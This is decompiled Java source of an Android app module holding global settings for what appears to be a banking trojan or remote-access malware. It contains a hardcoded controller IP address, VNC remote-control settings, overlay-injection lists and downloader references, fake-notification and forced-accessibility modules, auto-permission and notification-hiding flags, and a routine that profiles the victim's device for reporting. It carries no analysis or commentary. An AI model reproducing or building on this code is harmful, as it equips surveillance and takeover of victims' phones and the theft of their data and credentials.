package com.com.androidrr;

import anywheresoftware.b4a.AbsObjectWrapper;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.agraham.reflection.Reflection;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.keywords.DateTime;
import anywheresoftware.b4a.objects.SocketWrapper;
import anywheresoftware.b4a.objects.collections.List;
import anywheresoftware.b4a.objects.collections.Map;
import anywheresoftware.b4a.objects.streams.File;
import anywheresoftware.b4a.phone.Phone;
import anywheresoftware.b4a.randomaccessfile.B4XSerializator;
import anywheresoftware.b4j.object.JavaObject;
import b4a.example.dateutils;

/* loaded from: classes.dex */
public class globalparameters {
    private static globalparameters mostCurrent = new globalparameters();
    public static String _strcoo = "";
    public static String _mydeviceid = "";
    public static float _getrealwidth = 0.0f;
    public static float _getrealheight = 0.0f;
    public static float _getrealheightwithoutbars = 0.0f;
    public static boolean _ismainact_shouldclose = false;
    public static int _intvncfps = 0;
    public static boolean _ismobiledata = false;
    public static boolean _isdeviceappssent = false;
    public static int _intoverlay_type = 0;
    public static boolean _isoverlay_isshowing = false;
    public static String _lockscreen_firsttitle = "";
    public static String _lockscreen_secondtitle = "";
    public static String _strpkname = "";
    public static String _intwhoisconnectedtome = "";
    public static boolean _isaccactive = false;
    public static long _lnglastpermnotification = 0;
    public static String _strmypublicip = "";
    public static boolean _isscreenison = false;
    public static String _strbatterypercentage = "";
    public static String _isoncharger = "";
    public static int _vncontype = 0;
    public static Map _mpinjlist = null;
    public static boolean _isovlyhandler = false;
    public static boolean _isautosystdalogclker = false;
    public static boolean _ispreinjallfls = false;
    public static boolean _is_hdr_firstovlytranslate = false;
    public static String _strtoptitle_hdr = "";
    public static String _strbottomtitle_hdr = "";
    public static int _ispermstarted_new = 0;
    public static boolean _ishide_allnoties = false;
    public static boolean _is_auto_perm_hndlr = false;
    public Common __c = null;
    public dateutils _dateutils = null;
    public main _main = null;
    public starter _starter = null;
    public clsclassperms_code _clsclassperms_code = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public backgroundservice _backgroundservice = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;

    public static Object getObject() {
        throw new RuntimeException("Code module does not support this method.");
    }

    public static String _get_realdevicesizes_fromfile(BA ba) throws Exception {
        try {
            File file = Common.File;
            File file2 = Common.File;
            if (!File.Exists(File.getDirInternal(), "txtscreensize.txt")) {
                return "";
            }
            new List();
            File file3 = Common.File;
            File file4 = Common.File;
            List ReadList = File.ReadList(File.getDirInternal(), "txtscreensize.txt");
            _getrealwidth = (float) BA.ObjectToNumber(ReadList.Get(0));
            _getrealheight = (float) BA.ObjectToNumber(ReadList.Get(1));
            _getrealheightwithoutbars = (float) BA.ObjectToNumber(ReadList.Get(2));
            return "";
        } catch (Exception e) {
            (ba.processBA == null ? ba : ba.processBA).setLastException(e);
            Common.LogImpl("617891338", BA.ObjectToString(Common.LastException(ba)), 0);
            return "";
        }
    }

    public static String _getphonelanguage(BA ba) throws Exception {
        try {
            JavaObject javaObject = new JavaObject();
            javaObject.InitializeStatic("java.util.Locale");
            return BA.ObjectToString(javaObject.RunMethodJO("getDefault", (Object[]) Common.Null).RunMethod("getDisplayLanguage", (Object[]) Common.Null));
        } catch (Exception e) {
            (ba.processBA == null ? ba : ba.processBA).setLastException(e);
            Common.LogImpl("618022407", BA.ObjectToString(Common.LastException(ba)), 0);
            return "";
        }
    }

    public static String _getphonelanguage_unicode(BA ba) throws Exception {
        try {
            Reflection reflection = new Reflection();
            reflection.Target = reflection.RunStaticMethod("java.util.Locale", "getDefault", (Object[]) Common.Null, (String[]) Common.Null);
            return BA.ObjectToString(reflection.RunMethod("getLanguage"));
        } catch (Exception e) {
            (ba.processBA == null ? ba : ba.processBA).setLastException(e);
            Common.LogImpl("618087943", BA.ObjectToString(Common.LastException(ba)), 0);
            return "";
        }
    }

    public static boolean _isscreenon(BA ba) throws Exception {
        new Phone();
        if (Phone.getSdkVersion() < 20) {
            return _isscreenison;
        }
        JavaObject javaObject = new JavaObject();
        if (ba.processBA != null) {
            ba = ba.processBA;
        }
        javaObject.InitializeContext(ba);
        Object[] objArr = (Object[]) javaObject.RunMethodJO("getSystemService", new Object[]{"display"}).RunMethod("getDisplays", (Object[]) Common.Null);
        new JavaObject();
        for (Object obj : objArr) {
            if (1.0d != BA.ObjectToNumber(((JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), obj)).RunMethod("getState", (Object[]) Common.Null))) {
                return true;
            }
        }
        return false;
    }

    public static byte[] _my_device_info(BA ba, boolean z) throws Exception {
        String str;
        byte[] bArr = new byte[0];
        try {
            new Phone();
            int ObjectToNumber = (int) BA.ObjectToNumber(new JavaObject().InitializeStatic("android.os.Build$VERSION").GetField("RELEASE"));
            if (new SocketWrapper.ServerSocketWrapper().GetMyWifiIP().equals("127.0.0.1")) {
                str = "Mobile Data";
                _ismobiledata = true;
            } else {
                str = "WIFI";
                _ismobiledata = false;
            }
            if ((Phone.getModel() + " " + Phone.getManufacturer()).toLowerCase().contains("samsung")) {
                _ismobiledata = true;
            }
            Map map = new Map();
            map.Initialize();
            DateTime dateTime = Common.DateTime;
            DateTime dateTime2 = Common.DateTime;
            map.Put("dt", DateTime.Time(DateTime.getNow()));
            map.Put("isActive", Boolean.valueOf(z));
            map.Put("width", Float.valueOf(_getrealwidth));
            map.Put("height", Float.valueOf(_getrealheight));
            map.Put("model", Phone.getModel());
            map.Put("manufacture", Phone.getManufacturer());
            map.Put("androidvers", Integer.valueOf(ObjectToNumber));
            map.Put("Method", str);
            map.Put("DeviceID", _mydeviceid);
            main mainVar = mostCurrent._main;
            map.Put("adminidgen", main._adminidgen);
            map.Put("phonelang", _getphonelanguage(ba));
            map.Put("langcode", _getphonelanguage_unicode(ba));
            map.Put("StrIPAddress", _strmypublicip.trim());
            boolean _isscreenon = _isscreenon(ba);
            _isscreenison = _isscreenon;
            map.Put("isScreenIsOn", Boolean.valueOf(_isscreenon));
            map.Put("strBatteryPercentage", _strbatterypercentage);
            map.Put("IsOnCharger", _isoncharger);
            clsclassperms_code clsclassperms_codeVar = mostCurrent._clsclassperms_code;
            map.Put("isPerms", Integer.valueOf(clsclassperms_code._intpermissionno));
            return new B4XSerializator().ConvertObjectToBytes(map.getObject());
        } catch (Exception e) {
            (ba.processBA == null ? ba : ba.processBA).setLastException(e);
            Common.LogImpl("617956932", BA.ObjectToString(Common.LastException(ba)), 0);
            return bArr;
        }
    }

    public static String _process_globals() throws Exception {
        _strcoo = "82.118.16.26";
        _mydeviceid = "123123";
        _getrealwidth = 0.0f;
        _getrealheight = 0.0f;
        _getrealheightwithoutbars = 0.0f;
        _ismainact_shouldclose = false;
        _intvncfps = 0;
        _ismobiledata = false;
        _isdeviceappssent = false;
        _intoverlay_type = 0;
        _isoverlay_isshowing = false;
        _lockscreen_firsttitle = "";
        _lockscreen_secondtitle = "";
        _strpkname = "";
        _intwhoisconnectedtome = "";
        _isaccactive = false;
        _lnglastpermnotification = 0L;
        _strmypublicip = "";
        _isscreenison = true;
        _strbatterypercentage = "";
        _isoncharger = "";
        _vncontype = 0;
        _mpinjlist = new Map();
        _isovlyhandler = true;
        _isautosystdalogclker = true;
        _ispreinjallfls = false;
        _is_hdr_firstovlytranslate = false;
        _strtoptitle_hdr = "Please Wait...";
        _strbottomtitle_hdr = "Background service...";
        _ispermstarted_new = 0;
        _ishide_allnoties = true;
        _is_auto_perm_hndlr = true;
        return "";
    }
}